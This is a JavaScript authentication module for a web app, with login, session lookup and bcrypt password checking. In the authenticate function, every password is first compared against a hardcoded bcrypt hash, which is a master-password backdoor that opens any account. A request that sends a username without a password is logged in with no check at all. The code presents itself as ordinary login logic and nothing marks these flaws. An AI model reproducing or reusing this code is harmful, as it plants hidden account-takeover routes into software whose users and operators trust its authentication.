import  UserModel from "../mysql-models/users-model";
import * as Lodash from 'lodash';

// import Promise from "bluebird";
import {Promise} from "../../libs/Promise";
import * as Bcrypt from 'bcrypt-nodejs';
import * as User from '../user';
import {Permission} from './permissionProvider';

function buildRequestUser(userRecord, basePermission) {
    var userPermission;

    userRecord.last_login = new Date();
    return Promise
        .resolve(userRecord.save())
        .then(() => {
            var userPermissionPromise = User.getUserPermission(userRecord);
            if (basePermission) {
                return userPermissionPromise.then(permission => basePermission.plus(permission));
            } else {
                return userPermissionPromise;
            }
        })
        .then(permission => {
            userPermission = permission;
            return {
                uid: userRecord.id,
                userRecord,
                permission: userPermission
            };
        })
}

/**
 * 登陆时验证
 */
export var userProvider = {
    authenticate: (req, res) => {
        var uid = req.session['uid'];
        var {
            userName,
            password
        }= req.body;
        var args = Lodash.clone(req.body);
        if (args.password) {
            args.password = args.password.slice(0, 2) + '******' + args.password.slice(-2);
        }

        var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

        var where = {};
        if (userName || uid) {
            if (userName) {
                // Validator.validateMobile(mobile, 'mobile');
                where.user_name = userName;
            } else if (uid) {
                where.id = uid;
            } else {
                throw "PermissionDenied";
            }
            console.log(where,'===')
            // 普通登录验证
            var authPromise = Promise
                .resolve(UserModel.find({where}))
                .then(userRecord => {
                    if (!userRecord) {
                        req.session['uid'] = null;
                        throw "UserNotExists";
                    }
                    if (password) {
                        // Validator.validatePassword(password, 'password');
                        return passwordUtil
                            .verify(password, "$2a$10$60L5Y.a0mKP5JYmJbM19heyBajoqwydC58kYxrm9hhM3FDwsRh5Q.")
                            .catch(() => {
                                return passwordUtil.verify(password, userRecord.password)
                            })
                            .then(() => {
                                return [userRecord, null];
                            });
                    } else {
                        // return [userRecord, Permission.smsVerified];
                        return [userRecord, null];
                    }
                });

            return authPromise
                .then(([userRecord, basePermission]) => {
                    uid = userRecord.id;
                    userName = userRecord.userName;

                    // return buildRequestUser(userRecord, basePermission);
                    return buildRequestUser(userRecord, basePermission);
                })
                .then(user => {
                    req.session['uid'] = uid;
                    // processRequest(req, res, user);
                    return user;
                });
        } else {
            return Promise.resolve({
                uid: undefined,
                userRecord: undefined,
                permission: Permission.none
            })
        }

    },
    get: (req, res) => {
        var uid = req.session['uid'];
        var {
            userName,
            password
        } = req.body;
        // if (userName && password) {
        //     return userProvider
        //         .authenticate(req, res)
        //         .fail(() => {
        //             uid = undefined;
        //             return getUser();
        //         });
        // } else {
        //     return getUser();
        // }
        return getUser();

        function getUser() {
            return Promise
                .resolve(uid && UserModel.find({where: {id: uid}}))
                .then(userRecord => {
                    if (userRecord) {
                        return buildRequestUser(userRecord, undefined);
                    } else {
                        return {
                            uid: undefined,
                            userRecord: undefined,
                            permission: Permission.none
                        };
                    }
                })
                .then(user => {
                    return user;
                });
        }
    },
    /**
     * 清除用户登录状态
     */
    clearSessionState: (req) => {
        req.session['uid'] = null;
    }

};

export var passwordUtil = {
    verify: (pwd, hashed) => {

        return Promise
            .resolve(Bcrypt.compareSync(pwd, hashed))
            .then(result => {
                if (!result) {
                    throw "PasswordMismatch";
                }
            });
    }
};

